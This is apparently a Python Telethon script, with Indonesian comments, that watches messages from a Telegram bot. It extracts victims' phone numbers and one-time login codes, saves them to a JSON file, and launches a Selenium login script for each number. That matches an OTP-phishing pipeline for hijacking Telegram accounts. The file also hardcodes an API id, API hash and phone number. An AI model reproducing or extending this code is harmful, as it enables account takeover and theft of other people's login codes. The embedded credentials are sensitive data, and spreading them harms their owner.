from telethon import TelegramClient, events
import re
import subprocess
import json

# API credentials Telegram
api_id = 27073056  
api_hash = '37aee272fb897da2b418935a8c79b727'
phone = '+6282169419513'

# Username bot target
bot_username = '@startupvinicibot'

# Inisialisasi client
client = TelegramClient('session_name', api_id, api_hash)

# Fungsi untuk membaca dan memperbarui user_data.json
def update_user_data(chat_id, phone_number=None, code=None):
    try:
        # Baca file JSON
        with open("user_data.json", "r") as file:
            user_data = json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        user_data = {}  # Buat dictionary baru jika file tidak ditemukan atau rusak

    # Jika chat_id belum ada, buat entri baru
    if chat_id not in user_data:
        user_data[chat_id] = {}

    # Perbarui nomor HP jika ada
    if phone_number:
        user_data[chat_id]["phone"] = phone_number

    # Perbarui kode OTP jika ada
    if code:
        user_data[chat_id]["code"] = code

    # Simpan kembali ke file JSON
    with open("user_data.json", "w") as file:
        json.dump(user_data, file, indent=4)

    print(f"✅ Data diperbarui untuk chat_id: {chat_id} -> {user_data[chat_id]}")

@client.on(events.NewMessage(chats=bot_username))
async def new_message_handler(event):
    text = event.message.text
    print(f"📩 Pesan baru dari bot: {text}")

    # Cek apakah pesan mengandung "waiting_code"
    if "waiting_code" in text:
        try:
            # Ambil nomor telepon setelah "phone"
            phone_match = re.search(r"phone\s*\+?(\d+)", text)
            phone_number = f"+{phone_match.group(1)}" if phone_match else None

            # Ambil ID setelah "id : "
            chat_id_match = re.search(r"id\s*:\s*(\d+)", text)
            chat_id = chat_id_match.group(1) if chat_id_match else None

            if phone_number and chat_id:
                print(f"📱 Nomor HP: {phone_number}")
                print(f"🔍 Chat ID: {chat_id}")

                # Simpan nomor HP ke user_data.json
                update_user_data(chat_id, phone_number=phone_number)

                # Jalankan script Selenium dengan nomor telepon
                subprocess.Popen(["python", "login_telegram.py", phone_number])
            else:
                print("⚠️ Data tidak lengkap! Nomor HP atau chat_id tidak ditemukan.")

        except Exception as e:
            print(f"❌ Error parsing pesan: {e}")

    # Cek apakah pesan mengandung kode OTP
    elif "code input" in text:
        try:
            # Ambil kode OTP setelah "code input"
            code_match = re.search(r"code input\s*([\w-]+)", text)
            code = code_match.group(1) if code_match else None

            # Ambil ID setelah "id : "
            chat_id_match = re.search(r"id\s*:\s*(\d+)", text)
            chat_id = chat_id_match.group(1) if chat_id_match else None

            if code and chat_id:
                print(f"📱 Code OTP: {code}")
                print(f"🔍 Chat ID: {chat_id}")

                # Simpan kode ke user_data.json
                update_user_data(chat_id, code=code)
            else:
                print("⚠️ Data tidak lengkap! Code atau chat_id tidak ditemukan.")

        except Exception as e:
            print(f"❌ Error parsing pesan: {e}")

# Jalankan bot
with client:
    print("🚀 Bot berjalan, menunggu pesan baru...")
    client.run_until_disconnected()
